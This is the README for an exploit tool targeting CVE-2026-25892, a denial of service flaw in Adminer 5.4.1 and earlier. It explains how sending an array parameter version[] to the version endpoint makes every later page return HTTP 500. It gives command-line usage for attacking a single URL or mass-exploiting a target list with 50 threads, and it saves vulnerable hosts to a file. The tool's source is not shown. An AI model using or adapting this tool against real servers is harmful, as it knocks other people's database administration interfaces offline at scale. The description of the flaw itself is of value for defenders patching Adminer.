# CVE-2026-25892 - Adminer Unauthenticated DoS Exploit - By Dz MinD Injector

## 🎯 Overview

**CVE-2026-25892** is an unauthenticated persistent Denial of Service (DoS) vulnerability affecting **Adminer <= 5.4.1**. 

The vulnerability exists in the version endpoint (`/?script=version`) where improper input validation allows an attacker to inject an array parameter (`version[]`) instead of a string. This causes PHP's type juggling to trigger a `TypeError` in `openssl_verify()`, resulting in persistent HTTP 500 errors for all subsequent requests.

### Key Details
| Attribute | Value |
|-----------|-------|
| **CVE ID** | CVE-2026-25892 |
| **CWE** | CWE-20: Improper Input Validation |
| **CVSS 3.1** | 7.5 (HIGH) |
| **Affected** | Adminer <= 5.4.1 |
| **Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | None |
| **User Interaction** | None |

---

## ✨ Features

- 🚀 **Single Target & Mass Scanning** - Exploit one or multiple targets
- ⚡ **Multi-threading Support** - Fast concurrent scanning
- 📊 **Auto-Export** - Saves vulnerable targets to `vulnerable.txt`
- 🔍 **Smart Validation** - Detects Adminer presence before exploitation
- 🛡️ **Error Handling** - Robust connection and timeout management
- 📱 **Verbose Mode** - Detailed debugging information

---

## 📥 Installation

```bash
# Clone the repository
git clone https://github.com/[username]/CVE-2026-25892.git
cd CVE-2026-25892

# Install dependencies (requests only)
pip install requests

🚀 Usage
Single Target

bash
python3 cve_2026_25892.py -u http://target.com/adminer

With Verbose Output

bash
python3 cve_2026_25892.py -u http://target.com/adminer -v

Mass Scanning (Multi-threaded)

bash
python3 cve_2026_25892.py -f targets.txt -t 50

All Options

bash
usage: cve_2026_25892.py [-h] [-u URL] [-f FILE] [-t THREADS] [-v] [--timeout TIMEOUT]

CVE-2026-25892 - Adminer Unauthenticated DoS Exploit

options:
  -h, --help           Show this help message and exit
  -u URL, --url URL    Single target URL (e.g., http://target.com/adminer)
  -f FILE, --file FILE File containing multiple targets (one per line)
  -t THREADS           Number of threads (default: 10)
  -v, --verbose        Enable verbose output
  --timeout TIMEOUT    Request timeout in seconds (default: 10)

🎯 Target Format

⚠️ Important: You must specify the full path to Adminer, not just the base URL.
✅ Correct Examples

text
http://target.com/adminer
https://target.com:8080/adminer
http://target.com/adminer.php
http://target.com/tools/adminer

❌ Incorrect Examples

text
http://target.com           # Missing Adminer path
http://target.com/          # Trailing slash, no path

🔬 Technical Details
Vulnerability Mechanism

    Normal Flow: Adminer's version endpoint expects version as a string parameter via postMessage from adminer.org

    Payload: Sending version[] (array syntax) causes PHP to convert it to an array

    Trigger: On next page load, openssl_verify() receives an array instead of string

    Result: TypeError thrown → HTTP 500 for all users
